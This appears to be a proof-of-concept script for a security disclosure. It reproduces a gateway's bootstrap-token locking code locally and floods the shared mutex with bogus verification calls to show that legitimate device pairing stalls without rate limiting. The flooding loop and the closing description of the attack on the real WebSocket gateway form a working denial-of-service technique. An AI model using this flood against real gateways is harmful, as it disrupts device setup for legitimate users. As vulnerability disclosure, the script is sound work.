/**
 * PoC: Bootstrap token mutex stall (Finding 1) — standalone Node.js version
 *
 * Replicates the exact lock + disk-I/O pattern from:
 *   src/infra/json-files.ts       (createAsyncLock, readJsonFile, writeJsonAtomic)
 *   src/infra/pairing-token.ts    (generatePairingToken, verifyPairingToken)
 *   src/infra/device-bootstrap.ts (issueDeviceBootstrapToken, verifyDeviceBootstrapToken)
 *
 * Run: node scripts/poc-bootstrap-dos.mjs
 */

import { randomBytes, timingSafeEqual } from "node:crypto";
import { rm, mkdtemp, readFile, writeFile, rename } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

// ── Replicated from src/infra/json-files.ts ──────────────────────────────────

function createAsyncLock() {
  let lock = Promise.resolve();
  return async function withLock(fn) {
    const prev = lock;
    let release;
    lock = new Promise((resolve) => {
      release = resolve;
    });
    await prev;
    try {
      return await fn();
    } finally {
      release();
    }
  };
}

async function readJsonFile(filePath) {
  try {
    const text = await readFile(filePath, "utf8");
    return JSON.parse(text);
  } catch {
    return undefined;
  }
}

async function writeJsonAtomic(filePath, data) {
  const tmp = filePath + ".tmp." + randomBytes(4).toString("hex");
  await writeFile(tmp, JSON.stringify(data, null, 2), "utf8");
  await rename(tmp, filePath);
}

// ── Replicated from src/infra/pairing-token.ts ───────────────────────────────

function generatePairingToken() {
  return randomBytes(32).toString("base64url");
}

function safeEqualSecret(a, b) {
  // Matches src/security/secret-equal.ts
  const aBuf = Buffer.from(a);
  const bBuf = Buffer.from(b);
  const len = Math.max(aBuf.length, bBuf.length);
  const aPad = Buffer.concat([aBuf, Buffer.alloc(len - aBuf.length)]);
  const bPad = Buffer.concat([bBuf, Buffer.alloc(len - bBuf.length)]);
  return timingSafeEqual(aPad, bPad) && aBuf.length === bBuf.length;
}

function verifyPairingToken(provided, expected) {
  if (!provided.trim() || !expected.trim()) return false;
  return safeEqualSecret(provided, expected);
}

// ── Replicated from src/infra/device-bootstrap.ts ────────────────────────────

const DEVICE_BOOTSTRAP_TOKEN_TTL_MS = 10 * 60 * 1000; // 10 minutes

function makeBootstrapPath(baseDir) {
  return join(baseDir, "bootstrap.json");
}

// One lock per module, shared across all calls in the same process —
// exactly as in the real gateway (module-level const)
const withLock = createAsyncLock();

async function loadState(baseDir) {
  return (await readJsonFile(makeBootstrapPath(baseDir))) ?? {};
}

async function persistState(state, baseDir) {
  await writeJsonAtomic(makeBootstrapPath(baseDir), state);
}

async function issueDeviceBootstrapToken(baseDir) {
  return withLock(async () => {
    const state = await loadState(baseDir);
    const token = generatePairingToken();
    const issuedAtMs = Date.now();
    state[token] = { token, issuedAtMs, deviceId: null, publicKey: null };
    await persistState(state, baseDir);
    return { token, expiresAtMs: issuedAtMs + DEVICE_BOOTSTRAP_TOKEN_TTL_MS };
  });
}

async function verifyDeviceBootstrapToken({ token, deviceId, publicKey, baseDir }) {
  return withLock(async () => {
    const state = await loadState(baseDir);
    const providedToken = token.trim();
    if (!providedToken) return { ok: false, reason: "bootstrap_token_invalid" };

    const entry = Object.values(state).find((c) => verifyPairingToken(providedToken, c.token));
    if (!entry) return { ok: false, reason: "bootstrap_token_invalid" };

    // First-claimer wins: bind to device on first successful verify
    if (!entry.deviceId && !entry.publicKey) {
      state[entry.token] = { ...entry, deviceId, publicKey };
      await persistState(state, baseDir);
      return { ok: true };
    }
    if (entry.deviceId === deviceId && entry.publicKey === publicKey) {
      return { ok: true };
    }
    return { ok: false, reason: "bootstrap_token_invalid" };
  });
}

// ── PoC ──────────────────────────────────────────────────────────────────────

function fakeDevice() {
  return {
    deviceId: "device-" + randomBytes(8).toString("hex"),
    publicKey: randomBytes(32).toString("base64"),
  };
}

async function timeVerify(baseDir, token, device) {
  const t0 = performance.now();
  const result = await verifyDeviceBootstrapToken({ token, ...device, baseDir });
  return { ms: performance.now() - t0, result };
}

async function main() {
  const baseDir = await mkdtemp(join(tmpdir(), "openclaw-poc-"));

  try {
    console.log("=".repeat(65));
    console.log(" PoC: Bootstrap token mutex stall — no rate limiting (Finding 1)");
    console.log("=".repeat(65));
    console.log();
    console.log("Each verifyDeviceBootstrapToken() call goes through a single");
    console.log("in-process promise-chain mutex (createAsyncLock) + disk I/O.");
    console.log("No rate limit exists on this path (unlike device-token auth).");
    console.log();

    // ── Baseline ──────────────────────────────────────────────────────────────
    const baseDevice = fakeDevice();
    const { token: baseToken } = await issueDeviceBootstrapToken(baseDir);
    const { ms: baseMs, result: baseResult } = await timeVerify(baseDir, baseToken, baseDevice);
    console.log(
      `Baseline (no attacker load): ${baseMs.toFixed(2)}ms   result=${JSON.stringify(baseResult)}`,
    );
    console.log();
    console.log(
      `${"Attacker calls".padEnd(16)} ${"Stall (ms)".padEnd(12)} ${"Factor".padEnd(8)} Severity`,
    );
    console.log("─".repeat(65));

    // ── Attack scenarios ───────────────────────────────────────────────────────
    for (const attackerCount of [10, 50, 100, 250, 500]) {
      const legitDevice = fakeDevice();
      const { token } = await issueDeviceBootstrapToken(baseDir);

      // Attacker synchronously queues N calls on the mutex FIRST.
      // These are wrong tokens so they all fail, but each still acquires
      // the lock, reads bootstrap.json, and releases — serialised.
      const attackerCalls = [];
      for (let i = 0; i < attackerCount; i++) {
        attackerCalls.push(
          verifyDeviceBootstrapToken({
            token: randomBytes(32).toString("base64url"), // always wrong
            deviceId: "attacker-" + i,
            publicKey: randomBytes(32).toString("base64"),
            baseDir,
          }),
        );
      }

      // Legitimate device queues its call AFTER the attacker flood.
      const t0 = performance.now();
      const legitCall = verifyDeviceBootstrapToken({ token, ...legitDevice, baseDir });

      const [legitResult] = await Promise.all([legitCall, Promise.all(attackerCalls)]);
      const elapsedMs = performance.now() - t0;
      const factor = elapsedMs / baseMs;

      const severity =
        factor > 100 ? "CRITICAL" : factor > 20 ? "HIGH    " : factor > 5 ? "MEDIUM  " : "LOW     ";
      const bar = "█".repeat(Math.min(Math.round(factor / 5), 20));

      console.log(
        `${String(attackerCount).padEnd(16)} ${elapsedMs.toFixed(0).padEnd(12)} ${("x" + factor.toFixed(0)).padEnd(8)} ${severity} ${bar}  ok=${legitResult.ok}`,
      );
    }

    console.log();
    console.log("=".repeat(65));
    console.log("CONCLUSION");
    console.log("=".repeat(65));
    console.log("Legitimate device pairing stalls proportionally to attacker");
    console.log("call count. In the real gateway every WebSocket connection");
    console.log("shares the same process and the same mutex. An attacker with");
    console.log("a fast connection can push hundreds of bogus bootstrap calls");
    console.log("per second during the 10-minute pairing window, delaying or");
    console.log("breaking the setup flow with no per-IP lockout triggered.");
  } finally {
    await rm(baseDir, { recursive: true, force: true });
  }
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
